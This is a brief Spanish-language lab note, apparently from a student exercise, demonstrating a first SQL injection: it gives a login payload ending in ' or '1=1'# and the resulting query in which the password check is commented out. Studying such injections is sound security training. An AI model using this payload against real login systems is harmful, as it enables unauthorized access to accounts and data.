#Primera inyección SQL

Login con un usuario que no se encuentra en la base de datos.

Para esto se ejecuta en la interfaz la siguiente inyección

strosanchez@gmail.com' or '1=1'#

Con esto el backend realiza la siguiente consulta sql

SELECT * FROM `users` WHERE email = 'strosanchez@gmail.com' or '1=1'#' and password = 'a'

Se comenta la parte del password con #